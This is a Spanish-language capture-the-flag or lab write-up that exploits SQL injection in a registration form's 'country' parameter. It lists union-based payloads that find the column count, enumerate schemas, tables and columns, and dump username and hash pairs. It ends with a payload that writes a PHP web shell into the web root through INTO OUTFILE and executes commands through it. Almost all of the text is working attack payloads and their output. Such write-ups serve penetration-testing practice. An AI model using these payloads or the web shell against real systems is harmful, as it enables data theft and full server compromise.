Explotación: SQLI

Interceptamos la petición con burpsuite y comenzamos a explotar SQLI

Modificamos ambos campos con ' en busca de un error de la base de datos

username=alvruigut'&country=Brazil 
# 200 OK
username=alvruigut&country=Brazil'
# Fatal Error: ...

Buscar número de columnas con order by 100

username=alvruigut&country=Brazil' order by 100-- -
# Fatal Error: ... -> Aparece el mismo error. No Funciona ya que debe salir de error (Columna desconocida)

Buscar número de columnas con union select hasta encontrar una respuesta válida

username=alvruigut&country=Brazil' union select 1,2,3-- -
# Fatal Error: ... 
username=alvruigut&country=Brazil' union select 1,2-- -
# Fatal Error: ... 
username=alvruigut&country=Brazil' union select 1-- -
# 200 OK -> Hay una columna

Listar la base de datos que ejecuta la consulta

username=alvruigut&country=Brazil' union select database()-- -
# registration

# Si hubiese tres columnas ser operaría con tres argumentos: ' union SELECT 1,2,database()-- -

Listar bases de datos

username=alvruigut&country=Brazil' union select schema_name from information_schema.schemata-- -
# information_schema
# performance_schema
# mysql
# registration

Listar tablas de la base de datos registration

username=alvruigut&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- -
# La base de datos registration tiene la tabla registration

Listar columnas de la tabla registration

username=alvruigut&country=Brazil' union select column_name from information_schema.columns where table_schema="registration" and table_name="registration"-- -
# La tabla registration tiene las columnas: username, userhash, country, regtime

Listar datos de la tabla registration con el formato username:userhash

username=alvruigut&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- -
# Sin usuarios ni hashes relevantes

Subir archivo php malicioso

username=alvruigut&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/shell.php"-- -
# Acceder a http://<ip_target>/shell.php?cmd=whoami
